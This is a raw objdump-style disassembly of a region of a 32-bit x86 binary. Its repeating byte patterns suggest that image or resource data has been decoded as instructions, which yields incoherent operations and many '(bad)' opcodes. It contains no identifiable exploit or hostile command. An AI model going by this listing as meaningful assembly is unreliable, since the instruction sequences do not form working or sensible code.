  414f48:	(bad)  
  414f4a:	(bad)  
  414f4c:	rcl    al,1
  414f4e:	sar    bh,1
  414f50:	iret   
  414f51:	iret   
  414f52:	iret   
  414f53:	(bad)  
  414f54:	jmp    0xcdcd:0xcdffeaea
  414f5b:	dec    esi
  414f5d:	into   
  414f5e:	into   
  414f5f:	call   eax
  414f61:	rcl    al,1
  414f63:	jmp    DWORD PTR [eax+0x1daca0a0]
  414f69:	sbb    eax,0x361d
  414f6e:	add    BYTE PTR [ecx],cl
  414f70:	add    BYTE PTR [eax],al
  414f72:	add    BYTE PTR [ecx],ch
  414f74:	add    BYTE PTR [eax],al
  414f76:	add    BYTE PTR [esi],dl
  414f78:	add    BYTE PTR [eax],al
  414f7a:	add    BYTE PTR [eax+eax*1],al
	...
  414fad:	add    BYTE PTR [eax],al
  414faf:	add    BYTE PTR [ebx-0x2c184c4d],dh
  414fb5:	rcl    ebx,cl
  414fb7:	inc    edi
  414fb9:	mov    edi,0xc8c8c8ff
  414fbf:	call   esp
  414fc1:	aam    0xd4
  414fc3:	(bad)  
  414fc4:	(bad)  
  414fc6:	(bad)  
  414fc8:	loope  0x414fab
  414fca:	loope  0x414fcb
  414fcc:	rcl    dl,cl
  414fce:	sar    bh,cl
  414fd0:	iret   
  414fd1:	iret   
  414fd2:	iret   
  414fd3:	(bad)  
  414fd4:	fcmovu st,st(2)
  414fd6:	(bad)  
  414fd8:	mov    ebp,0xc3ffbdbd
  414fdd:	ret    
  414fde:	ret    
  414fdf:	push   DWORD PTR [esi-0x3a00494a]
  414fe5:	(bad)
  414fe8:	mov    al,0xb0
  414fea:	mov    al,0xff
  414fec:	add    BYTE PTR [eax],al
  414fee:	add    BYTE PTR [eax+eax*1+0x0],dl
  414ff2:	add    BYTE PTR [edx],bh
  414ff4:	add    BYTE PTR [eax],al
  414ff6:	add    BYTE PTR [esi],ch
  414ff8:	add    BYTE PTR [eax],al
  414ffa:	add    BYTE PTR [edi],dl
  414ffc:	add    BYTE PTR [eax],al
  414ffe:	add    BYTE PTR [edx],cl
	...
  41502c:	stos   BYTE PTR es:[edi],al
  41502d:	stos   BYTE PTR es:[edi],al
  41502e:	stos   BYTE PTR es:[edi],al
  41502f:	cs mov ebp,0xb7ffbdbd
  415035:	mov    bh,0xb7
  415037:	(bad)  
  415038:	mov    esi,0xc6ffbebe
  41503d:	mov    dh,0xff
  415040:	iret   
  415041:	iret   
  415042:	iret   
  415043:	(bad)  
  415044:	fcmovu st,st(2)
  415046:	(bad)  
  415048:	fcmovnu st,st(3)
  41504a:	(bad)  
  41504c:	iret   
  41504d:	iret   
  41504e:	iret   
  41504f:	inc    edi
  415051:	mov    edi,0xcacacaff
  415057:	inc    esi
  415059:	mov    dh,0xff
  41505c:	mov    ecx,0x9effb9b9
  415061:	sahf   
  415062:	sahf   
  415063:	dec    DWORD PTR [esi-0x36007172]
  415069:	leave  
  41506a:	leave  
  41506b:	jmp    DWORD PTR [ecx]
  41506d:	and    DWORD PTR [ecx],esp
  41506f:	jno    0x415071
  415071:	add    BYTE PTR [eax],al
  415073:	and    DWORD PTR [eax],eax
  415075:	add    BYTE PTR [eax],al
  415077:	xor    al,BYTE PTR [eax]
  415079:	add    BYTE PTR [eax],al
  41507b:	pop    ds
  41507c:	add    BYTE PTR [eax],al
  41507e:	add    BYTE PTR [edx],dl
	...
  4150b0:	(bad)
  4150b3:	loope  0x415083
  4150b5:	into   
  4150b6:	into   
  4150b7:	(bad)  
  4150b8:	mov    edi,0xbfffbfbf
  4150bd:	mov    edi,0xc9c9ffbf
  4150c2:	leave  
  4150c3:	call   eax
  4150c5:	rcl    al,1
  4150c7:	call   edx
  4150c9:	rcl    ah,cl
  4150cb:	dec    edi
  4150cd:	iret   
  4150ce:	iret   
  4150cf:	inc    esi
  4150d1:	mov    dh,0xff
  4150d4:	mov    esi,0xa2ffbebe
  4150d9:	mov    ds:0x8585ffa2,al
  4150de:	test   edi,edi
  4150e0:	test   BYTE PTR [esp+eax*4-0x64646401],al
  4150e7:	call   DWORD PTR [ebp+0xef9595]
  4150ed:	add    BYTE PTR [eax],al
  4150ef:	pop    ss
  4150f0:	or     al,0xc
  4150f2:	or     al,0x18
  4150f4:	or     BYTE PTR [eax],cl
  4150f6:	or     DWORD PTR ds:0x13000000,edx
  4150fc:	add    BYTE PTR [eax],al
  4150fe:	add    BYTE PTR [eax+eax*1],cl
  415101:	add    BYTE PTR [eax],al
  415103:	add    BYTE PTR [ecx],bh
  415105:	cmp    edi,DWORD PTR [edx+ebx*1]
  415108:	push   ebp
  415109:	push   ebp
  41510a:	push   edi
  41510b:	enter  0x8789,0x87
  41510f:	call   DWORD PTR [ecx+0x50]
  415112:	push   eax
  415113:	sahf   
  415114:	add    DWORD PTR [ecx],eax
  415116:	add    DWORD PTR [edx],edi
  415118:	add    BYTE PTR [eax],al
  41511a:	add    BYTE PTR [esi],dh
  41511c:	adc    edx,DWORD PTR [ebx]
  41511e:	adc    esi,DWORD PTR [ecx+0x14]
  415121:	adc    al,0x14
  415123:	fs inc ebx
  415125:	inc    ebx
  415126:	inc    ecx
  415127:	or     eax,0x0
	...
  415134:	mov    DWORD PTR [ecx-0x2c2c5c77],ecx
  41513a:	aam    0xff
  41513c:	retf   
  41513d:	retf   
  41513e:	retf   
  41513f:	push   DWORD PTR [esi-0x4f004a4a]
  415145:	mov    al,0xb0
  415147:	jmp    FWORD PTR [edi-0x65005251]
  41514d:	cdq    
  41514e:	cdq    
  41514f:	inc    DWORD PTR [ebx+0x6aff8384]
  415155:	push   0x6a
  415157:	call   DWORD PTR [ebx+0x52]
  41515a:	push   edx
  41515b:	jmp    DWORD PTR [edi+0x67]
  41515e:	call   DWORD PTR [di-0x6c6d]
  415163:	push   DWORD PTR [esp+esi*4-0x5e5b004b]
  41516a:	mov    eax,ds:0xa4a2a5de
  41516f:	fcmovnb st,st(3)
  415171:	ret    
  415172:	(bad)  
  415173:	call   FWORD PTR [edi+0x5f]
  415176:	pop    ebp
  415177:	pop    edx
  415178:	add    BYTE PTR [eax],al
  41517a:	add    BYTE PTR [eax],al
  41517c:	add    BYTE PTR [eax],al
  41517e:	add    BYTE PTR ds:0x0,al
  415184:	jge    0x415202
  415186:	jge    0x415150
  415188:	sahf   
  415189:	fwait
  41518a:	cdq    
  41518b:	push   DWORD PTR [edi-0x1f004e4e]
  415191:	loopne 0x415174
  415193:	call   FWORD PTR [ebx+0x47ff9b9b]
  415199:	inc    edi
  41519a:	inc    edi
  41519b:	sti    
  41519c:	push   0xa5ff6868
  4151a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151a3:	clc    
  4151a4:	lea    ecx,[ebp+0x1e1eda8b]
  4151aa:	sbb    eax,0x4d4c4c73
  4151af:	push   cs
	...
  4151b8:	and    DWORD PTR [eax],esp
  4151ba:	push   ds
  4151bb:	dec    ecx
  4151bc:	jb     0x415230
  4151be:	jo     0x41517e
  4151c0:	fwait
  4151c1:	fwait
  4151c2:	fwait
  4151c3:	out    dx,al
  4151c4:	pushf  
  4151c5:	call   0xff75:0x7777ff99
  4151cc:	jae    0x41523e
  4151ce:	jae    0x4151cf
  4151d0:	je     0x415243
  4151d2:	je     0x4151d3
  4151d4:	add    BYTE PTR [ecx-0x6061007d],0xa1
  4151db:	jmp    FWORD PTR [ebx-0x4800494e]
  4151e1:	(bad)  
  4151e2:	retf   
  4151e3:	inc    eax
  4151e5:	(bad)  
  4151e7:	dec    edi
  4151e9:	jmp    0xe51e51da
  4151ee:	out    0xff,al
  4151f0:	rcl    ebx,cl
  4151f2:	aam    0xff
  4151f4:	pop    esi
  4151f5:	pop    esi
  4151f6:	pop    esi
  4151f7:	add    BYTE PTR [eax],0x0
	...
  415202:	add    BYTE PTR [eax],al
  415204:	lea    ecx,[ebp+ecx*4-0x4b484417]
  41520b:	dec    DWORD PTR [esi-0x52007173]
  415211:	lods   eax,DWORD PTR ds:[esi]
  415212:	scas   al,BYTE PTR es:[edi]
  415213:	call   edx
  415215:	aam    0xd2
  415217:	inc    esp
  415219:	(bad)  
  41521a:	(bad)  
  41521b:	call   DWORD PTR [eax+0x52ec9190]
  415221:	push   edx
  415222:	push   edx
  415223:	mov    edx,0xc87a7979
  415228:	lods   al,BYTE PTR ds:[esi]
  415229:	lods   al,BYTE PTR ds:[esi]
  41522a:	lods   eax,DWORD PTR ds:[esi]
  41522b:	stc    
  41522c:	mov    BYTE PTR [eax+0x2b2be68a],cl
  415232:	sub    edi,DWORD PTR [ecx+0x0]
  415235:	add    BYTE PTR [eax],al
  415237:	or     al,BYTE PTR [eax]
  415239:	add    BYTE PTR [eax],al
  41523b:	add    BYTE PTR [ebx],dh
  41523d:	xor    DWORD PTR ds:0x6663631f,esi
  415243:	test   BYTE PTR [edx-0x77026b71],cl
  415249:	xchg   ecx,eax
  41524a:	cwde   
  41524b:	dec    DWORD PTR [esp+ebx*4-0x5068005d]
  415252:	mov    bh,0xff
  415254:	mov    ecx,0xcbffd9d3
  415259:	in     al,0xe5
  41525b:	call   eax
  41525d:	fsubrp st(0),st
  41525f:	call   ebp
  415261:	rcl    al,cl
  415263:	call   esp
  415265:	mov    cl,0xa7
  415267:	call   ecx
  415269:	jl     0x4152e5
  41526b:	dec    ebx
  41526d:	mov    esp,0xc8bbffb6
  415272:	enter  0x93ff,0x93
  415276:	xchg   ecx,eax
  415277:	cwde   
	...
  415284:	xchg   DWORD PTR [ebp-0x453f267b],eax
  41528a:	mov    ebx,0xa4a1a4ff
  41528f:	jmp    FWORD PTR [ebp-0x51005354]
  415295:	scas   al,BYTE PTR es:[edi]
  415296:	lods   eax,DWORD PTR ds:[esi]
  415297:	jmp    FWORD PTR [edx-0x30005657]
  41529d:	iret   
  41529e:	iret   
  41529f:	call   edi
  4152a1:	xlat   BYTE PTR ds:[ebx]
  4152a2:	xlat   BYTE PTR ds:[ebx]
  4152a3:	dec    DWORD PTR [ebx+ecx*4+0x5153dd8c]
  4152aa:	push   edx
  4152ab:	loope  0x415231
  4152ad:	add    DWORD PTR [edi+edi*8-0xe919396],0xffffff8d
  4152b5:	xchg   esi,eax
  4152b6:	call   0xb5ff:0xc7c2b1ed
  4152bd:	int    0xd4
  4152bf:	jmp    FWORD PTR [eax+ecx*8-0x34510032]
  4152c6:	int3   
  4152c7:	(bad)  
  4152c8:	mov    ebp,0xc5ffc8c6
  4152cd:	mov    bh,0xb5
  4152cf:	inc    edi
  4152d1:	lods   al,BYTE PTR ds:[esi]
  4152d2:	stos   BYTE PTR es:[edi],al
  4152d3:	dec    eax
  4152d5:	xchg   esi,eax
  4152d6:	mov    ?,edi
  4152d8:	lds    ebp,FWORD PTR [ecx+0x59]
  4152db:	(bad)  
  4152dc:	mov    ebx,0xafff1e2d
  4152e1:	add    eax,0xa3ff00
  4152e6:	add    bh,bh
  4152e8:	cdq    
  4152e9:	add    BYTE PTR [eax],al
  4152eb:	(bad)  
  4152ec:	mov    esp,0xc3ff848a
  4152f1:	loopne 0x4152d7
  4152f3:	call   FWORD PTR [eax+0xb59494]
	...
  415301:	add    BYTE PTR [eax],al
  415303:	add    BYTE PTR [edx+ecx*4-0x3b352375],cl
  41530a:	(bad)  
  41530d:	mov    ds:0xadacffa5,eax
  415312:	scas   al,BYTE PTR es:[edi]
  415313:	jmp    DWORD PTR [edx-0x6d005b5c]
  415319:	xchg   ecx,eax
  41531a:	xchg   ecx,eax
  41531b:	call   DWORD PTR [ecx+0x7fff928e]
  415321:	mov    WORD PTR [esi-0x514b6901],cs
  415327:	(bad)  
  415328:	mov    ecx,0xd4ffd3ce
  41532d:	out    dx,al
  41532e:	hlt    
  41532f:	(bad)  
  415330:	fdiv   st(3),st
  415332:	std    
  415333:	call   eax
  415335:	loope  0x41531a
  415337:	inc    esi
  415339:	rol    al,0xff
  41533c:	mov    esp,0xbbff9e9f
  415341:	jge    0x4153b8
  415343:	push   DWORD PTR [ebp+ebx*2+0x35abff5d]
  41534a:	xor    edi,edi
  41534c:	mov    al,ds:0xa0ff000c
  415351:	add    BYTE PTR [eax],al
  415353:	jmp    DWORD PTR [ecx-0x5d010000]
  415359:	add    BYTE PTR [eax],al
  41535b:	jmp    DWORD PTR [ebx+ecx*1+0x1dabff00]
  415362:	or     bh,bh
  415364:	mov    dl,0x2c
  415366:	sbb    bh,bh
  415368:	mov    bh,0x16
  41536a:	add    bh,bh
  41536c:	(bad)  
  41536d:	mov    DWORD PTR [eax-0x15193901],eax
  415373:	call   DWORD PTR [edx+0xcc8e8f]
	...
  415381:	add    BYTE PTR [eax],al
  415383:	add    BYTE PTR [ecx-0x2d1f7173],dl
  415389:	int    0xcc
  41538b:	jmp    DWORD PTR [esi-0x51005e5e]
  415391:	lods   al,BYTE PTR ds:[esi]
  415392:	scas   eax,DWORD PTR es:[edi]
  415393:	jmp    FWORD PTR [ecx-0x68005657]
  415399:	xchg   edi,eax
  41539a:	xchg   edi,eax
  41539b:	jmp    FWORD PTR [eax-0x58005359]
  4153a1:	mov    ch,0xb6
  4153a3:	inc    eax
  4153a5:	iret   
  4153a6:	retf   0xbaff
  4153a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153ab:	push   DWORD PTR [eax-0x5d008d8c]
  4153b1:	push   eax
  4153b2:	push   edx
  4153b3:	call   FWORD PTR [eax-0x7100cccb]
  4153b9:	adc    DWORD PTR [eax],edx
  4153bb:	inc    DWORD PTR [ebp-0x7e010000]
  4153c1:	add    BYTE PTR [eax],al
  4153c3:	inc    DWORD PTR [ebx-0x7200feff]
  4153c9:	add    BYTE PTR [eax],al
  4153cb:	call   FWORD PTR [edx-0x5000fffe]
  4153d1:	xor    DWORD PTR ds:0x2b3db7ff,ebx
  4153d7:	(bad)  
  4153d8:	mov    ebx,0xbfff293c
  4153dd:	aas    
  4153de:	sub    eax,0x2d41c2ff
  4153e3:	inc    esi
  4153e5:	inc    ebx
  4153e6:	sub    al,0xff
  4153e8:	enter  0x1029,0xff
  4153ec:	int3   
  4153ed:	je     0x415456
  4153ef:	inc    esi
  4153f1:	jmp    0x93d953e3
  4153f6:	xchg   edx,eax
  4153f7:	(bad)  
	...
  415404:	xchg   ebx,eax
  415405:	(bad)  
  415406:	xchg   edx,eax
  415407:	loope  0x4153e3
  415409:	rcl    dl,cl
  41540b:	jmp    DWORD PTR [esi-0x53005a5c]
  415411:	scas   al,BYTE PTR es:[edi]
  415412:	scas   eax,DWORD PTR es:[edi]
  415413:	jmp    FWORD PTR [edx+ebp*4-0x63630054]
  41541a:	pushf  
  41541b:	inc    edx
  41541d:	rcl    edi,cl
  41541f:	call   DWORD PTR [eax-0x7100bbbd]
  415425:	adc    al,0x17
  415427:	dec    DWORD PTR [esp+ecx*1+0x7cff05]
  41542e:	add    bh,bh
  415430:	je     0x415432
  415432:	add    bh,bh
  415434:	jne    0x415436
  415436:	add    bh,bh
  415438:	jnp    0x41543a
  41543a:	add    bh,bh
  41543c:	mov    DWORD PTR [ebx],eax
  41543e:	add    bh,bh
  415440:	ja     0x415464
  415442:	sbb    edi,edi
  415444:	outs   dx,DWORD PTR ds:[esi]
  415445:	sub    esp,DWORD PTR [edx]
  415447:	call   FWORD PTR [ecx-0x5200fff0]
  41544d:	sbb    BYTE PTR [ecx],al
  41544f:	inc    eax
  415451:	dec    eax
  415452:	cmp    edi,edi
  415454:	lds    ecx,FWORD PTR [ebp+edi*1-0x1]
  415458:	retf   0x3a4b
  41545b:	dec    esi
  41545d:	dec    edi
  41545e:	cmp    al,0xff
  415460:	rcl    DWORD PTR [edx+0x3e],1
  415463:	call   esp
  415465:	push   esi
  415466:	inc    ecx
  415467:	call   esi
  415469:	inc    esp
  41546a:	sub    eax,0x5367d2ff
  41546f:	dec    edx
  415471:	out    0xeb,al
  415473:	call   FWORD PTR [ebp-0x6c196162]
  415479:	xchg   ebx,eax
  41547a:	xchg   ebx,eax
  41547b:	adc    al,BYTE PTR [eax]
  41547d:	add    BYTE PTR [eax],al
  41547f:	add    BYTE PTR [eax],al
  415481:	add    BYTE PTR [eax],al
  415483:	add    BYTE PTR [ecx-0x211e6d6f],dl
  415489:	(bad)  
  41548a:	fdivr  st,st(7)
  41548c:	test   al,0xa6
  41548e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41548f:	jmp    FWORD PTR [esi-0x4e005150]
  415495:	mov    al,0xb1
  415497:	jmp    DWORD PTR [eax-0x38005f60]
  41549d:	fcmovu st,st(7)
  41549f:	inc    DWORD PTR [ecx+0x7fff272b]
  4154a5:	add    BYTE PTR [eax],al
  4154a7:	dec    DWORD PTR [ebp-0x7400f6eb]
  4154ad:	sbb    BYTE PTR [edi],cl
  4154af:	dec    DWORD PTR [ebx-0x7600f3e9]
  4154b5:	adc    BYTE PTR ds:0x1090ff,al
  4154bb:	(bad)  
  4154bc:	jns    0x4154e2
  4154be:	sbb    bh,bh
  4154c0:	mov    cl,0xa7
  4154c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154c3:	push   DWORD PTR [esp+esi*4+0x1e76ffb4]
  4154ca:	push   ss
  4154cb:	push   DWORD PTR [ebp-0x2e00f4e2]
  4154d1:	gs push edx
  4154d3:	call   ebx
  4154d5:	fs push edx
  4154d7:	call   edi
  4154d9:	bound  ecx,QWORD PTR [esi-0x1]
  4154dc:	fisub  DWORD PTR [eax+edx*2-0x1]
  4154e0:	frstor [edi+0x52]
  4154e3:	jmp    eax
  4154e5:	imul   edx,DWORD PTR [ebp-0x1],0xff475fe6
  4154ec:	in     al,0x68
  4154ee:	push   edx
  4154ef:	call   eax
  4154f1:	in     eax,0xe6
  4154f3:	jmp    DWORD PTR [edx-0x6b005658]
  4154f9:	nop
  4154fa:	nop
  4154fb:	add    BYTE PTR cs:[eax],al
  4154fe:	add    BYTE PTR [eax],al
  415500:	add    BYTE PTR [eax],al
  415502:	add    BYTE PTR [eax],al
  415504:	xchg   ebx,eax
  415505:	nop
  415506:	xchg   edx,eax
  415507:	loope  0x4154e7
  415509:	aam    0xd5
  41550b:	jmp    DWORD PTR [ebp-0x4f005b5d]
  415511:	scas   eax,DWORD PTR es:[edi]
  415512:	scas   eax,DWORD PTR es:[edi]
  415513:	push   DWORD PTR [esp+esi*4-0x5959004b]
  41551a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41551b:	inc    ebx
  41551d:	rcl    dl,1
  41551f:	dec    DWORD PTR [edi-0x7100a7a3]
  415525:	adc    ecx,DWORD PTR [eax]
  415527:	call   FWORD PTR [eax-0x6c00d6d1]
  41552d:	daa    
  41552e:	and    bh,bh
  415530:	xchg   edx,eax
  415531:	sub    BYTE PTR ds:0x71391ff,bl
  415537:	(bad)  
  415538:	js     0x415557
  41553a:	pop    ss
  41553b:	inc    ebp
  41553d:	mov    bh,0xb5
  41553f:	(bad)  
  415540:	(bad)  
  415542:	(bad)  
  415544:	(bad)
  415547:	call   FWORD PTR [ebp-0x5c007878]
  41554d:	sub    edx,DWORD PTR [esi]
  41554f:	(bad)  
  415550:	fnstsw WORD PTR [edx+0x6b]
  415553:	(bad)  
  415554:	fnsave [edx+eiz*2-0x1]
  415558:	loopne 0x4155ce
  41555a:	(bad)  
  41555b:	jmp    ebx
  41555d:	ja     0x4155c2
  41555f:	jmp    esi
  415561:	js     0x4155c7
  415563:	(bad)  
  415564:	jmp    0xec40bde4
  415569:	ja     0x4155c9
  41556b:	(bad)  
  41556c:	in     al,dx
  41556d:	jo     0x4155c9
  41556f:	call   ebx
  415571:	fsubrp st(1),st
  415573:	jmp    FWORD PTR [ecx-0x6d004d4f]
  415579:	xchg   ecx,eax
  41557a:	xchg   ecx,eax
  41557b:	dec    ecx
	...
  415584:	xchg   edx,eax
  415585:	mov    ss,WORD PTR [eax-0x32322e1f]
  41558b:	call   FWORD PTR [ebp-0x4d006465]
  415591:	mov    cl,0xb1
  415593:	(bad)  
  415594:	mov    edi,0xb3ffc0c0
  415599:	mov    bl,0xb3
  41559b:	dec    eax
  41559d:	rcl    ebx,1
  41559f:	call   FWORD PTR [edx-0x7100868a]
  4155a5:	sbb    dl,BYTE PTR [ecx]
  4155a7:	call   FWORD PTR [esi-0x6400cdc6]
  4155ad:	cmp    dh,BYTE PTR [esi]
  4155af:	call   DWORD PTR [edi+0x7cff2731]
  4155b5:	das    
  4155b6:	sub    bh,bh
  4155b8:	xlat   BYTE PTR ds:[ebx]
  4155b9:	int3   
  4155ba:	retf   
  4155bb:	push   esi
  4155bd:	div    dh
  4155bf:	call   FWORD PTR [ebx-0x4a00a49d]
  4155c5:	xchg   ecx,eax
  4155c6:	mov    edi,edi
  4155c8:	(bad)  
  4155ca:	(bad)  
  4155cc:	nop
  4155cd:	pusha  
  4155ce:	pop    eax
  4155cf:	jmp    edx
  4155d1:	pop    DWORD PTR [edx+0x7485e6ff]
  4155d7:	(bad)  
  4155d8:	jmp    0xec40cb64
  4155dd:	mov    DWORD PTR [edi-0x1],esi
  4155e0:	out    dx,al
  4155e1:	mov    bh,BYTE PTR [ecx-0x1]
  4155e4:	lock lea edi,[edx-0x1]
  4155e8:	repz (bad) 
  4155ea:	jns    0x4155eb
  4155ec:	hlt    
  4155ed:	js     0x415652
  4155ef:	call   ebp
  4155f1:	rcl    cl,cl
  4155f3:	jmp    FWORD PTR [ebp-0x6e004143]
  4155f9:	mov    cs,WORD PTR [ebp+0x5d]
  4155ff:	add    BYTE PTR [eax],al
  415601:	add    BYTE PTR [eax],al
  415603:	add    BYTE PTR [ecx-0x331e6d72],dl
  415609:	mov    ah,0xbe
  41560b:	call   DWORD PTR [ebp-0x4900757d]
  415611:	mov    edx,0xcbcbffb7
  415616:	retf   
  415617:	(bad)  
  415618:	mov    ebx,0xc6ffbbba
  41561d:	retf   
  41561e:	int    0xff
  415620:	lahf   
  415621:	xchg   edx,eax
  415622:	xchg   esp,eax
  415623:	dec    DWORD PTR [edi-0x5900e5df]
  415629:	dec    ecx
  41562a:	inc    ebx
  41562b:	jmp    FWORD PTR [ebx-0x5b00b3ab]
  415631:	dec    ecx
  415632:	inc    ecx
  415633:	call   esp
  415635:	int3   
  415636:	int3   
  415637:	(bad)  
  415638:	out    dx,al
  415639:	in     al,dx
  41563a:	jmp    0x41563b
  41563c:	xchg   ebx,eax
  41563d:	dec    esi
  41563e:	inc    ebp
  41563f:	jmp    FWORD PTR [ebp-0x5200fce8]
  415645:	ss and edi,edi
  415648:	out    0xdf,eax
  41564a:	(bad)  
  41564c:	fcom   st(6)
  41564e:	(bad)  
  41564f:	jmp    DWORD PTR [edi-0x11008a83]
  415655:	cwde   
  415656:	xchg   edi,edi
  415658:	lock cdq 
  41565a:	mov    edi,edi
  41565c:	repz fwait
  41565e:	mov    bh,bh
  415660:	neg    BYTE PTR [ebp-0x61080074]
  415666:	(bad)  
  415667:	(bad)  
  415668:	cli    
  415669:	mov    ds:0x89fcff91,al
  41566e:	jb     0x41566f
  415670:	loope  0x415636
  415672:	mov    edi,0xd0ccb7ff
  415677:	call   DWORD PTR [ecx+0x678d8d]
  41567d:	add    BYTE PTR [eax],al
  41567f:	add    BYTE PTR [eax],al
  415681:	add    BYTE PTR [eax],al
  415683:	add    BYTE PTR [edi-0x501e757f],cl
  415689:	stos   BYTE PTR es:[edi],al
  41568a:	test   al,0xff
  41568c:	xchg   ecx,eax
  41568d:	fwait
  41568e:	xchg   ebp,eax
  41568f:	(bad)  
  415690:	mov    ebp,0xcdffbbb4
  415695:	ror    dh,1
  415697:	(bad)  
  415698:	mov    edi,0xc1ffbfbd
  41569d:	(bad)
  4156a0:	mov    al,0xb6
  4156a2:	mov    edx,0x212a8eff
  4156a7:	jmp    FWORD PTR [esi-0x4c00b0aa]
  4156ad:	pusha  
  4156ae:	push   edi
  4156af:	call   DWORD PTR [ebp-0x5b00ede7]
  4156b5:	push   eax
  4156b6:	dec    edx
  4156b7:	call   DWORD PTR [esi+esi*1+0x16aaff28]
  4156be:	add    edi,edi
  4156c0:	mov    bh,0x17
  4156c2:	add    bh,bh
  4156c4:	rcr    BYTE PTR [ecx],0x1
  4156c7:	push   DWORD PTR [ebx-0x9a98]
  4156cd:	(bad)  
  4156ce:	(bad)  
  4156cf:	(bad)  
  4156d0:	mov    ecx,0xcbffaeb0
  4156d5:	mov    edi,DWORD PTR [edi-0x1]
  4156d8:	cmc    
  4156d9:	test   al,0x99
  4156db:	(bad)  
  4156dc:	clc    
  4156dd:	stos   BYTE PTR es:[edi],al
  4156de:	fwait
  4156df:	(bad)  
  4156e0:	cli    
  4156e1:	lods   eax,DWORD PTR ds:[esi]
  4156e2:	pushf  
  4156e3:	(bad)  
  4156e4:	std    
  4156e5:	scas   al,BYTE PTR es:[edi]
  4156e6:	popf   
  4156e7:	(bad)  
  4156e8:	push   DWORD PTR [ecx-0x6600005b]
  4156ee:	cmp    edi,0xffffffed
  4156f1:	mov    edi,0xd0bcffb7
  4156f6:	fdivr  st,st(7)
  4156f8:	xchg   ecx,eax
  4156f9:	mov    cs,WORD PTR [ebp+0x81]
  4156ff:	add    BYTE PTR [eax],al
  415701:	add    BYTE PTR [eax],al
  415703:	add    BYTE PTR [esi-0x72],dh
  415706:	sbb    ebp,0x15
  415709:	repnz test edi,edi
  41570c:	dec    ebx
  41570d:	(bad)  
  41570e:	mov    ?,edi
  415710:	fild   QWORD PTR [eax-0x282e003c]
  415716:	aam    0xff
  415718:	(bad)
  41571b:	inc    edi
  41571d:	enter  0xffc9,0xba
  415721:	retf   0xffce
  415724:	xchg   ecx,eax
  415725:	xor    DWORD PTR ds:0x6067b8ff,ebp
  41572b:	push   DWORD PTR [eax-0x6f00b6ae]
  415731:	add    BYTE PTR [eax],al
  415733:	jmp    DWORD PTR [ebx+edx*1+0x15aaff00]
  41573a:	add    bh,bh
  41573c:	mov    ah,0x18
  41573e:	add    bh,bh
  415740:	ret    0x1c
  415743:	dec    ecx
  415745:	sbb    al,BYTE PTR [eax]
  415747:	inc    ebp
  415749:	pop    ds
  41574a:	push   cs
  41574b:	call   ebp
  41574d:	mov    bl,0xff
  415750:	std    
  415751:	std    
  415752:	std    
  415753:	jmp    FWORD PTR [eax-0xd007471]
  415759:	mov    cl,0xa3
  41575b:	(bad)  
  41575c:	std    
  41575d:	mov    ebx,0xbdfeffac
  415762:	lods   eax,DWORD PTR ds:[esi]
  415763:	(bad)  
  415764:	(bad)  
  415765:	mov    edi,0xc3ffffae
  41576a:	mov    dh,0xff
  41576c:	push   DWORD PTR [edx-0x3d0f0066]
  415772:	mov    ch,0xff
  415774:	rcl    ah,0xda
  415777:	call   DWORD PTR [eax+0xb98b8d]
  41577d:	add    BYTE PTR [eax],al
  41577f:	add    BYTE PTR [eax],al
  415781:	add    BYTE PTR [eax],al
  415783:	add    BYTE PTR [eax-0x7f],ch
  415786:	jbe    0x415760
  415788:	add    BYTE PTR [ebx+0x39],bh
  41578b:	jmp    DWORD PTR [edx+0x78]
  41578e:	imul   edi,edi,0xffd0c4d8
  415794:	xlat   BYTE PTR ds:[ebx]
  415795:	(bad)  
  415797:	dec    edx
  415799:	retf   0xffca
  41579c:	int    0xcd
  41579e:	into   
  41579f:	(bad)  
  4157a0:	mov    esp,0x93ffd1ce
  4157a5:	xor    al,0x31
  4157a7:	(bad)  
  4157a8:	mov    esi,0xa2ff6870
  4157ad:	sub    esp,DWORD PTR [eax]
  4157af:	call   FWORD PTR [ebx-0x5100ffff]
  4157b5:	sbb    BYTE PTR [eax],al
  4157b7:	(bad)  
  4157b8:	mov    esi,0xcaff0019
  4157bd:	sbb    eax,0x24d6ff00
  4157c2:	add    bh,bh
  4157c4:	loopne 0x4157dc
  4157c6:	add    bh,bh
  4157c8:	lock sub al,0x4
  4157cb:	call   ebp
  4157cd:	lods   eax,DWORD PTR ds:[esi]
  4157ce:	mov    ds:0xdcdde0ff,eax
  4157d3:	jmp    eax
  4157d5:	loopne 0x4157b7
  4157d7:	jmp    DWORD PTR [edi-0x7d76]
  4157dd:	into   
  4157de:	mov    ebx,0xbcccffff
  4157e3:	(bad)  
  4157e4:	dec    edi
  4157e6:	mov    ebp,0xc5d5ffff
  4157eb:	(bad)  
  4157ec:	dec    ecx
  4157ee:	mov    cl,0xff
  4157f0:	hlt    
  4157f1:	ret    
  4157f2:	lods   eax,DWORD PTR ds:[esi]
  4157f3:	inc    ebp
  4157f5:	aam    0xdc
  4157f7:	call   DWORD PTR [ecx-0x681f7071]
  4157fd:	xchg   edi,eax
  4157fe:	xchg   edi,eax
  4157ff:	or     eax,DWORD PTR [eax]
  415801:	add    BYTE PTR [eax],al
  415803:	add    BYTE PTR [edx+ebp*2+0x71],dh
  415807:	in     al,0x47
  415809:	es sub eax,0x675f7aff
  41580f:	inc    eax
  415811:	mov    bh,0xff
  415814:	xlat   BYTE PTR ds:[ebx]
  415815:	fcomp  st(0)
  415817:	inc    ebx
  415819:	ret    
  41581a:	ret    
  41581b:	call   eax
  41581d:	rcl    cl,1
  41581f:	(bad)  
  415820:	mov    esi,0x95ffd3d0
  415825:	inc    edx
  415826:	cmp    eax,0x5461b7ff
  41582b:	call   FWORD PTR [ecx+ecx*1+0xfaaff00]
  415832:	add    bh,bh
  415834:	mov    bh,0x19
  415836:	add    bh,bh
  415838:	les    ebx,FWORD PTR [eax+eax*1]
  41583b:	call   eax
  41583d:	and    BYTE PTR [eax],al
  41583f:	(bad)  
  415840:	(bad)  [esi]
  415842:	add    bh,bh
  415844:	out    0xe,eax
  415846:	add    bh,bh
  415848:	hlt    
  415849:	dec    edx
  41584a:	sub    bh,bh
  41584c:	(bad)  
  41584d:	loopne 0x415827
